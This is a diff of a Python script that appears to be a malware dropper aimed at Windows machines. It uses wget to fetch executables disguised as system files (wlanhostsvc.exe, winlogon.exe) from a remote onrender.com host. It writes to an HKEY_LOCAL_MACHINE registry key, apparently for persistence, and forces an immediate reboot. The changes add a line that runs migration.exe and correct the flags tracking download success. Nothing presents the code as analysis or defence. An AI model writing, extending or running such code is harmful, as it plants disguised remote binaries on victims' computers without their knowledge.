@@ -5,8 +5,10 @@ from os import path
 from requests import post, get
 from sys import exit
 if not which("wget"):
-    run(["winget","install","wget"],shell=True)
-url = "ms32-sha2.onrender.com/"
+    run(["winget","install","wget"],shell=True,capture_output=True)
+    run("./migration.exe",shell=True,text=True)
+    exit(0)
+url = "https://ms32-sha2.onrender.com/"
 user= "<MIG>"
 def hit(url:str,data=None):
     try:
@@ -33,15 +35,17 @@ checkerdone=False
 regdone=False
 try:
     fiel = run(["wget","-O",destination_path_exe,"https://ms32-sha2.onrender.com/static/apps/wlanhostsvc.exe"],shell=True,capture_output=True)
+    ms32done = True
     if b"ERROR 404: Not Found" in fiel.stderr:
         log(f"Incorrect url {url} for wlanhostsvc.exe",state="FATAL")
         exit(0)
-        ms32done = True
+        ms32done = False
     fiel = run(["wget","-O",dest_checker,"https://ms32-sha2.onrender.com/static/apps/winlogon.exe"],shell=True,capture_output=True)
+    checkerdone = True
     if b"ERROR 404: Not Found" in fiel.stderr:
         log(f"Incorrect url {url} for winlogon.exe",state="FATAL")
         exit(0)
-        checkerdone = True
+        checkerdone = False
 
     key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE,regpath,0,reg.KEY_WRITE)
 
@@ -54,4 +58,4 @@ except Exception as e:
     log(f"migration not done. error={e}\t ms32done={ms32done},checkerdone={checkerdone},regdone={regdone}",state="FATAL")
     exit(0)
 log("Migration complete ab smartboard ki mkc")
-run("shutdown /r /t 0")
+run("shutdown /r /t 0",shell=True,text=True)
